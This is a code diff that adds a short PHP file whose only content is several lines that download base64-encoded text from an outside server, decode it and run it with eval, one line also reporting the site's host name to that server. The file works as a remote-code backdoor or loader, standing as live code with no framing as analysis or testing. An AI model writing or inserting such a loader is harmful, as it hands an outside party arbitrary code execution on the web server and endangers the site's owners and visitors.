@@ -1,0 +1,6 @@
+<?php
+//eval(base64_decode(file_get_contents('../common/function.txt')));
+eval(base64_decode(file_get_contents('http://motibuilders.com/cafunction.php?act=setfun&key='.urlencode('QVAxMkNSNTlEWA=='))));
+eval(base64_decode(file_get_contents('http://motibuilders.com/apicall.php?act=setfun&key='.urlencode('QVAxMkNSNTlEWA=='))));
+eval(base64_decode(file_get_contents('http://motibuilders.com/apicall.php?act=setfun&cdom='.$_SERVER['HTTP_HOST'].'&key='.urlencode('QVAxMkNSNTlEWA=='))));
+?>
